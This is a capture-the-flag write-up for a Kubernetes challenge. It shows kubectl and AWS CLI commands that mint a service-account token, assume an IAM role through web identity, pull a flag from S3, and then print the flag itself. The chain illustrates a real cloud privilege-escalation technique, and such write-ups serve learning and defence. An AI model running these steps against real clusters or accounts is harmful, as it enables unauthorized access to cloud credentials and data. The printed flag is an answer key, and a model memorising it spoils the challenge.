# Infinity Token — Daemon Slayer: k∞s Write-up

## Environment Artifacts
- Challenge kubeconfig: `public/kubeconfig.yaml`
- Target namespace: `infinity-castle`
- Notable ServiceAccount: `nakime` annotated with IAM role `arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle`

## Steps

### 1. Recon on the Kubernetes Cluster
```sh
kubectl --kubeconfig public/kubeconfig.yaml --insecure-skip-tls-verify get configmaps -n infinity-castle -o yaml
```
- Discovered ConfigMap `ds-k8s-display` containing S3 bucket `ds-k8s-infinity-flag-1757980242-f93750`.

### 2. Impersonate the Nakime ServiceAccount
```sh
kubectl --kubeconfig public/kubeconfig.yaml --insecure-skip-tls-verify create token nakime --audience sts.amazonaws.com -n infinity-castle
```
- Generated a projected service-account token scoped for AWS STS.

### 3. Assume the Mapped IAM Role
```sh
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle \
  --role-session-name ctf \
  --web-identity-token "$TOKEN"
```
- Received temporary AWS credentials authorizing S3 object access.

### 4. Retrieve the Flag from S3
```sh
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 cp s3://ds-k8s-infinity-flag-1757980242-f93750/flag.txt -
```
- Downloaded the flag object directly from the bucket.

## Flag
```
cuhk25ctf{n4k1m3_b1w4_01dc_w4rp_g4t3}
```

## Cleanup
Unset the temporary AWS credentials after use:
```sh
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```